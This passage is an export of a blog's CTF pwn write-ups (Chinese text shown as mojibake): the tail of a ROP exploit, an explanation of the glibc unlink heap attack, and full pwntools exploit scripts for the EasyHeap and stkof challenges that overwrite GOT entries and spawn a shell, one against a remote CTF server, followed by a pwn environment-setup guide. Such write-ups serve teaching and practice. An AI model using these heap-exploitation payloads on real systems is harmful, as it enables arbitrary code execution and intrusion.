class="line">bin_sh = elf_base + <span class="number">0x202080</span> </span><br><span class="line"></span><br><span class="line">add(<span class="number">0x4</span>,<span class="string">b&#x27;\x00&#x27;</span>)  <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;d&#x27;</span>*<span class="number">0x18</span>+p64(pop_4)) <span class="comment">#0</span></span><br><span class="line">payload1 = p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(pop_6)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(read_got)+p64(<span class="number">8</span>)+p64(bin_sh)+p64(<span class="number">0</span>)+p64(rop2)+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">56</span>+p64(main)</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&quot;yes\x00\x00\x00\x00\x00&quot;</span> + payload1</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;delete &#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;id:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Are you sure?:&#x27;</span>)</span><br><span class="line">p.send(payload1)</span><br><span class="line">puts_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">p.send(<span class="string">b&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x4</span>,<span class="string">b&#x27;\x00&#x27;</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;d&#x27;</span>*<span class="number">0x18</span>+p64(pop_4)) <span class="comment">#0</span></span><br><span class="line"></span><br><span class="line">payload2 = p64(pop_rdi) + p64(bin_sh) + p64(system_addr) + p64(main)</span><br><span class="line">payload2 = <span class="string">b&#x27;yes&#x27;</span>.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>) + payload2</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendline(<span class="string">&#x27;delete &#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;id:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Are you sure?:&#x27;</span>)</span><br><span class="line">p.send(payload2)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>##å‚è€ƒé“¾æ¥<br>
<a href="https://blog.csdn.net/qq_35429581/article/details/78231443">https://blog.csdn.net/qq_35429581/article/details/78231443</a><br>
<a href="https://www.cnblogs.com/luoleqi/p/12343147.html">https://www.cnblogs.com/luoleqi/p/12343147.html</a><br>
<a href="https://blog.csdn.net/Breeze_CAT/article/details/103788698">https://blog.csdn.net/Breeze_CAT/article/details/103788698</a></p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwnç¬”è®°</tag>
        <tag>glibcå †</tag>
      </tags>
  </entry>
  <entry>
    <title>Unlink</title>
    <url>/2021/10/04/Unlink/</url>
    <content><![CDATA[<h1>Unlink</h1>
<h2 id="åŸç†ä»‹ç»"><a class="header-anchor" href="#åŸç†ä»‹ç»">Â¶</a>åŸç†ä»‹ç»</h2>
<h3 id="unlink"><a class="header-anchor" href="#unlink">Â¶</a>unlink</h3>
<p>unlinkå…¶å®è¿›è¡Œè„±é“¾æ“ä½œï¼Œä¸‹é¢è´´ä¸€å¼ CTF-wikiä¸Šçš„åŸç†å›¾</p>
<span id="more"></span>
<p><img src="http://static.zybuluo.com/hgggg/sbd9qfl3g1fi9ty3umi38vot/38.png" alt="38.png-123.8kB"></p>
<p>ä¸€èˆ¬æ¥è¯´å°±æ˜¯å°†é“¾è¡¨å¤´å¤„å¤„äºfreeçŠ¶æ€çš„å †å—ä»unsorted binä¸­è„±ç¦»å‡ºæ¥ï¼Œ<br>
ç„¶åå’Œç‰©ç†ç›¸é‚»çš„å †å—åˆå¹¶æˆæ–°çš„å¤§å †å—ï¼ˆå‘å‰åˆå¹¶/å‘ååˆå¹¶ï¼‰ï¼Œæœ€åå†æ”¾å…¥åˆ°<br>
unsortedbinä¸­</p>
<h3 id="unlink-æºç é˜…è¯»"><a class="header-anchor" href="#unlink-æºç é˜…è¯»">Â¶</a>unlink æºç é˜…è¯»</h3>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* at malloc.c _int_free */</span></span><br><span class="line">  <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">    prevsize = p-&gt;prev_size;</span><br><span class="line">    size += prevsize;</span><br><span class="line">    p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">    unlink(av, p, bck, fwd);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>åœ¨freeå½“å‰å †å—çš„æ˜¯åï¼Œä¼šå…ˆæ£€æŸ¥å…¶ç‰©ç†ç›¸é‚»çš„å‰ä¸€ä¸ªå †å—æ˜¯ä¸æ˜¯å¤„äºé‡Šæ”¾çŠ¶æ€ï¼Œå¦‚æœå¤„äºfreeçŠ¶æ€åˆ™è¿›å…¥åˆ¤æ–­</p>
<p>å°†é¦–å…ˆä¼šæå–å½“å‰å †å—çš„å‰ä¸€ä¸ªå †å—çš„å¤§å°</p>
<p>å°†å½“å‰å †å—çš„sizeå’Œå‰ä¸€ä¸ªå †å—çš„sizeç›¸åŠ ï¼Œå³åˆå¹¶</p>
<p>å°†å½“å‰å †å—çš„æŒ‡é’ˆæŒ‡å‘å‰ä¸€ä¸ªå †å—</p>
<p>ç„¶åunlinkï¼Œå³å°†å½“å‰çš„Pæ‰€æŒ‡å‘çš„chunkä»åŒé“¾è¡¨ä¸­ç§»é™¤</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            \</span></span><br><span class="line"><span class="meta">    FD = P-&gt;fd;								      \</span></span><br><span class="line"><span class="meta">    BK = P-&gt;bk;								      \</span></span><br><span class="line"><span class="meta">    <span class="meta-keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))		      \</span></span><br><span class="line"><span class="meta">      malloc_printerr (check_action, <span class="meta-string">&quot;corrupted double-linked list&quot;</span>, P, AV);  \</span></span><br><span class="line"><span class="meta">    <span class="meta-keyword">else</span> &#123;								      \</span></span><br><span class="line"><span class="meta">        FD-&gt;bk = BK;							      \</span></span><br><span class="line"><span class="meta">        BK-&gt;fd = FD;							      \</span></span><br><span class="line"><span class="meta">        <span class="meta-keyword">if</span> (!in_smallbin_range (P-&gt;size)				      \</span></span><br><span class="line"><span class="meta">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) &#123;		      \</span></span><br><span class="line"><span class="meta">	    <span class="meta-keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0)	      \</span></span><br><span class="line"><span class="meta">		|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0))    \</span></span><br><span class="line"><span class="meta">	      malloc_printerr (check_action,				      \</span></span><br><span class="line"><span class="meta">			       <span class="meta-string">&quot;corrupted double-linked list (not small)&quot;</span>,    \</span></span><br><span class="line"><span class="meta">			       P, AV);					      \</span></span><br><span class="line"><span class="meta">            <span class="meta-keyword">if</span> (FD-&gt;fd_nextsize == NULL) &#123;				      \</span></span><br><span class="line"><span class="meta">                <span class="meta-keyword">if</span> (P-&gt;fd_nextsize == P)				      \</span></span><br><span class="line"><span class="meta">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;		      \</span></span><br><span class="line"><span class="meta">                <span class="meta-keyword">else</span> &#123;							      \</span></span><br><span class="line"><span class="meta">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;			      \</span></span><br><span class="line"><span class="meta">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;			      \</span></span><br><span class="line"><span class="meta">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;			      \</span></span><br><span class="line"><span class="meta">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;			      \</span></span><br><span class="line"><span class="meta">                  &#125;							      \</span></span><br><span class="line"><span class="meta">              &#125; <span class="meta-keyword">else</span> &#123;							      \</span></span><br><span class="line"><span class="meta">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;		      \</span></span><br><span class="line"><span class="meta">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;		      \</span></span><br><span class="line"><span class="meta">              &#125;								      \</span></span><br><span class="line"><span class="meta">          &#125;								      \</span></span><br><span class="line"><span class="meta">      &#125;									      \</span></span><br><span class="line"><span class="meta">&#125;</span></span><br></pre></td></tr></table></figure>
<p>å¯ä»¥çœ‹åˆ°è¿™é‡Œä¼šè¿›è¡Œä¸€ä¸ªæ£€æŸ¥ï¼Œåˆ¤æ–­FDçš„bkå’ŒBKçš„fdæ˜¯å¦æŒ‡å‘å½“å‰å †å—</p>
<h3 id="Unlink-çš„ç»•è¿‡å’Œåˆ©ç”¨"><a class="header-anchor" href="#Unlink-çš„ç»•è¿‡å’Œåˆ©ç”¨">Â¶</a>Unlink çš„ç»•è¿‡å’Œåˆ©ç”¨</h3>
<p>step1:ä¼ªé€ fake chunk</p>
<pre><code>chunk = 0x0602040
P ä¸ºæˆ‘ä»¬å°†è¦åˆå¹¶çš„åœ°å€,På­˜åœ¨äºchunkä¸­ï¼Œä¸”æœ‰*(chunk)=P
P-&gt;fd = chunk - 0x18 = 0x602028
P-&gt;bk = chunk - 0x10 = 0x602030
</code></pre>
<p>Step2: ç»•è¿‡æ£€æŸ¥</p>
<pre><code>Unlink(P,BK,FD)&#123;
    FD = P-&gt;fd     // FD = 0x602028
    BK = P-&gt;bk     // BK = 0x602030
    if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))&#123;
     // æ£€æŸ¥ç»•è¿‡ FD-&gt;bk = *(0x602028+0x18) = *(0x602040)
     //ç»•è¿‡2 Bk-&gt;fd = *(0x602030+0x10) = *(0x602040)  
     FD-&gt;bk = BK //*(0x602040) = 0x602030
     BK-&gt;fd = FD   //*(0x6020240) = 0x602028
    &#125;
&#125;
</code></pre>
<p>Step3: åŠ«æŒç¨‹åºæ‰§è¡Œæµ</p>
<pre><code>ç»è¿‡ä¸Šè¿°çš„æ­¥éª¤ï¼Œæˆ‘ä»¬å·²ç»å®ç°äº†åœ¨*(chunk)ä¸­å†™å…¥äº†chunk-0x18çš„å€¼
å¦‚è¿‡æˆ‘å‘chunk - 0x18 å†™å…¥__free_hook,åœ¨æˆ‘ä¸‹ä¸€æ¬¡ä¿®æ”¹çš„æ—¶å€™å°±å¯ä»¥æŠŠ__free_hookæ”¹å†™ä¸ºsystem
</code></pre>
<h2 id="åˆ—é¢˜"><a class="header-anchor" href="#åˆ—é¢˜">Â¶</a>åˆ—é¢˜</h2>
<h3 id="ZJCTF-2019-EasyHeap"><a class="header-anchor" href="#ZJCTF-2019-EasyHeap">Â¶</a>ZJCTF 2019 EasyHeap</h3>
<p>è¿™é“é¢˜ç½‘ä¸Šçš„wpå¤§å¤šéƒ½æ˜¯house of spirit ä»¥åŠ Unsorted bin attack, è¿™é‡Œä»‹ç»ä¸€ç§Unlinkçš„æ”»å‡»æ–¹å¼</p>
<h4 id="IDAåˆ†æ"><a class="header-anchor" href="#IDAåˆ†æ">Â¶</a>IDAåˆ†æ</h4>
<p>add</p>
<p><img src="http://static.zybuluo.com/hgggg/be6e1prqqmpinvcx751v0xlp/39.png" alt="39.png-43.8kB"></p>
<p>å¯ä»¥çœ‹åˆ°addæ˜¯ç”¨ä¸€ä¸ªheaparrayçš„æ•°ç»„æ¥ç®¡ç†å †å—çš„</p>
<p><img src="http://static.zybuluo.com/hgggg/ebbhnt7xr0p8sxtcrqky20zq/40.png" alt="40.png-19.9kB"></p>
<p>edit</p>
<p><img src="http://static.zybuluo.com/hgggg/icy3zhxsx8ifxfjuc1eezl92/41.png" alt="41.png-50.9kB"></p>
<p>delete</p>
<p><img src="http://static.zybuluo.com/hgggg/x6npivuk736g3yvmlb5dnw3k/42.png" alt="42.png-32kB"></p>
<p>åŒæ—¶è¯¥é¢˜ä¹Ÿæ²¡å¼€å¯PIEä¿æŠ¤</p>
<p><img src="http://static.zybuluo.com/hgggg/ksgf2d6r9b7dr7d238ixo334/43.png" alt="43.png-23.7kB"></p>
<p>è¿™é¢˜å°±éå¸¸é€‚åˆåˆ©ç”¨Unlinkæ‰‹æ³•æ¥æ„é€ exp</p>
<h4 id="è§£é¢˜æ€è·¯"><a class="header-anchor" href="#è§£é¢˜æ€è·¯">Â¶</a>è§£é¢˜æ€è·¯</h4>
<p>Step1:ä¼ªé€ fake chunk</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x30</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">add(<span class="number">0xf0</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>) + p64(chunk-<span class="number">0x18</span>)+p64(chunk-<span class="number">0x10</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x30</span>)+p64(<span class="number">0x100</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br></pre></td></tr></table></figure>
<p>ä¼ªé€ åå¯ä»¥å‘ç°æ­¤æ—¶chunk0å¤„äºfreeçŠ¶æ€</p>
<p><img src="http://static.zybuluo.com/hgggg/e5mmfpfyovlu8qpi6d4c8l4b/44.png" alt="44.png-21.6kB"></p>
<p>æ­¤æ—¶æˆ‘ä»¬é‡Šæ”¾æ‰å †å—1ï¼Œå¯ä»¥å‘ç°å †å—0å’Œå †å—1æˆåŠŸåˆå¹¶ï¼Œè§¦å‘Unlink</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">free(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<p><img src="http://static.zybuluo.com/hgggg/toot7r72l7m2qjirr2sj3sue/45.png" alt="45.png-77.3kB"></p>
<p>Step2ï¼šä»»æ„åœ°å€å†™</p>
<p>å¯ä»¥çœ‹åˆ°chunk0å·²ç»æŒ‡å‘äº†0x6020c8,æˆ‘ä»¬å¯ä»¥é€šè¿‡edit(0)ä¸ºsystemæœ€ågetshell</p>
<p><img src="http://static.zybuluo.com/hgggg/5w8ayit4cce7b0if21xr16st/46.png" alt="46.png-38.3kB"></p>
<h4 id="exp"><a class="header-anchor" href="#exp">Â¶</a>exp</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p  = process(<span class="string">&quot;easyheap&quot;</span>)</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.23.so&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;easyheap&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Size of Heap : &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Content of heap:&quot;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Index :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,size,data</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Index :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Size of Heap : &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Content of heap : &quot;</span>)</span><br><span class="line">    p.sendline(data)</span><br><span class="line"></span><br><span class="line">chunk = <span class="number">0x6020E0</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">add(<span class="number">0xf0</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>) + p64(chunk-<span class="number">0x18</span>)+p64(chunk-<span class="number">0x10</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x30</span>)+p64(<span class="number">0x100</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">system = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(system)+p64(system)+p64(free_got)</span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0x10</span>,p64(system))</span><br><span class="line">edit(<span class="number">3</span>,<span class="number">0x10</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="hitcon2014-stkof"><a class="header-anchor" href="#hitcon2014-stkof">Â¶</a>hitcon2014_stkof</h3>
<h4 id="é¢˜ç›®åˆ†æ"><a class="header-anchor" href="#é¢˜ç›®åˆ†æ">Â¶</a>é¢˜ç›®åˆ†æ</h4>
<p>æœ¬é¢˜å’Œä¸Šä¸€é¢˜åŒºåˆ«ä¸å¤§ï¼Œå”¯ä¸€çš„åŒºåˆ«å°±åœ¨äºæœ¬é¢˜æ²¡æœ‰è°ƒç”¨systemå‡½æ•°ï¼Œéœ€è¦æ³„éœ²libcåœ°å€</p>
<p>å³æŠŠfree_got æ”¹ä¸º puts_pltå³å¯æ³„éœ²åœ°å€</p>
<h4 id="exp-v2"><a class="header-anchor" href="#exp-v2">Â¶</a>exp</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;stkof&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.23.so&#x27;</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;stkof&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">26259</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size</span>):</span></span><br><span class="line">    p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,size,content</span>):</span></span><br><span class="line">    p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendline(content)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">chunk = <span class="number">0x602150</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x30</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0xf0</span>) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x100</span>) <span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x100</span>) <span class="comment">#5</span></span><br><span class="line"></span><br><span class="line">payload =  p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>) + p64(chunk-<span class="number">0x18</span>)+p64(chunk-<span class="number">0x10</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x30</span>)+p64(<span class="number">0x100</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">atoi_got = elf.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload =<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+ p64(atoi_got)+p64(atoi_got)+p64(free_got)</span><br><span class="line">edit(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">4</span>,<span class="built_in">len</span>(p64(puts_plt)),p64(puts_plt))</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - libc.sym[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">one = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1247</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">one_gadget = libc_base + one[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">edit(<span class="number">4</span>,<span class="built_in">len</span>(p64(system)),p64(system))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#p.sendline(&#x27;/bin/sh\x00&#x27;)</span></span><br><span class="line">edit(<span class="number">5</span>,<span class="number">0x8</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwnç¬”è®°</tag>
        <tag>glibcå †</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnå…¥é—¨ä¹‹ç¯å¢ƒæ­å»º</title>
    <url>/2021/10/04/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    <content><![CDATA[<h1>VMwareä¸‹çš„ctf(pwn)å…¥é—¨ç¯å¢ƒæ­å»º</h1>
<h2 id="å·¥å…·"><a class="header-anchor" href="#å·¥å…·">Â¶</a>å·¥å…·</h2>
<p>VMware15</p>
<p>unbuntu20.0é•œåƒ ä¸‹è½½åœ°å€ï¼š</p>
<pre><code>http://mirrors.163.com/ubuntu-releases/20.04/
</code></pre>
<p>è¯¦æƒ…è¯·è§https://blog.csdn.net/weixin_44169941/article/details/109263134</p>
<span id="more"></span>   
<h2 id="pwnç¯å¢ƒæ­å»º"><a class="header-anchor" href="#pwnç¯å¢ƒæ­å»º">Â¶</a>pwnç¯å¢ƒæ­å»º</h2>
<p>1.å®‰è£…vscode</p>
<pre><code>ç›´æ¥åœ¨Ubuntu software å®‰è£…å°±è¡Œ
</code></pre>
<p>2.å®‰è£…gcc</p>
<pre><code>sudo apt install gcc
gcc --version  
</code></pre>
<p>3.é…ç½®32ä½ç¯å¢ƒ</p>
<pre><code>sudo dpkg --add-architecture i386
sudo apt-get update
sudo apt install build-essential
sudo apt install gcc-multilib
</code></pre>
<p>4.å®‰è£…vim</p>
<pre><code>sudo apt install vim
</code></pre>
<p>5.å®‰è£…git</p>
<pre><code>sudo apt install git
</code></pre>
<p>6.å®‰è£…pwntools</p>
<pre><code>sudo apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential
sudo python3 -m pip install --upgrade pip
sudo python3 -m pip install --upgrade pwntools
</code></pre>
<p>7.å®‰è£…pwndbg + pwngdb è”åˆè°ƒè¯•ç¯å¢ƒ</p>
<p>pwngdb</p>
<pre><code>cd ~/
git clone https://github.com/scwuaptx/Pwngdb.git 
cp ~/Pwngdb/.gdbinit ~/
</code></pre>
<p>pwndbg</p>
<pre><code>git clone https://github.com/pwndbg/pwndbg
cd pwndbg
./setup.sh
</code></pre>
<p>è”åˆä½¿ç”¨</p>
<pre><code>vim ~/.gdbinit
æ³¨é‡Šæ‰ç¬¬ä¸€è¡Œ ç„¶ååœ¨ç¬¬äºŒè¡Œå†™å…¥
source ~/pwndbg/gdbinit.py
</code></pre>
<p>é£Ÿç”¨æ–¹æ³•æ±‡æ€»ï¼ˆæŒç»­ï¼‰</p>
<pre><code>1.å¸¦æºç è°ƒè¯•: gdb -q [file] -d [path]ï¼ˆé»˜è®¤ä¸º.ï¼‰
2.ä¸‹æ–­ç‚¹: b address
3.è¿è¡Œ: r
4.ç»§ç»­: c
5.è¿è¡Œä¸‹ä¸€æ­¥: ni
6.æ‰“å°é“¾æ¥åº“: vmmap
7.è¾“å‡ºlibc_base: libc
8.æŸ¥çœ‹å †: heapï¼Œparseheap
9.æŸ¥çœ‹bins: bin
10.æŸ¥çœ‹addresså¤„çš„å†…å­˜ x /nxg adress
11.æ‰“å°åœ°å€/æŒ‡é’ˆï¼šp address
12.æŸ¥çœ‹æ ˆï¼šstack length
13.æŸ¥çœ‹åœ°å€ï¼štelescoope address
14.æŸ¥çœ‹hex: hex address
15.æ ¼å¼åŒ–å­—ç¬¦ä¸²åç§»åœ°å€: fmtarg 
</code></pre>
<p>8.å®‰è£…docker</p>
<pre><code>sudo apt install docker.io
</code></pre>
<p>9.å®‰è£…seccomp-tools</p>
<pre><code>sudo apt install gcc ruby-dev
gem install seccomp-tools
</code></pre>
<p>10.å®‰è£…one_gadget</p>
<pre><code>sudo gem install one_gadget
</code></pre>
<p>11.å®‰è£…LibcSearcher</p>
<pre><code>sudo pip3 install LibcSearcher
sudo pip3 install -U LibcSearcher
</code></pre>
<p>12.å®‰è£…main_arena_offset</p>
<pre><code>git clone https://github.com/dev2ero/py_main_arena_offset.git
cd py_main_arena_offset
sudo python3 setup.py develop
</code></pre>
<p>é£Ÿç”¨æ–¹æ³•</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pymao <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">libc = <span class="string">&quot;./libc.so.6&quot;</span></span><br><span class="line">main_arena_offset = gmao( libc )</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(main_arena_offset))</span><br></pre></td></tr></table></figure>
<p>13.å®‰è£…æœ¬åœ°è°ƒè¯•ä¸åŒç‰ˆæœ¬çš„libcç¯å¢ƒ</p>
<p>glibc-all-in-one</p>
<pre><code>git clone https://github.com/matrix1001/glibc-all-in-one.git
cd glibc-all-in-one
python3 update_list
cat list
 ./download [libc-version]
</code></pre>
<p>patchelf</p>
<pre><code>git clone https://github.com/NixOS/patchelf.git
cd patchelf
sudo apt-get install autoconf automake libtool
./bootstrap.sh
./configure
make
sudo make install
</code></pre>
<p>é£Ÿç”¨æ–¹æ³•</p>
<pre><code>patchelf --replace-needed libc.so.6 [your-libc-path] [yourelf]
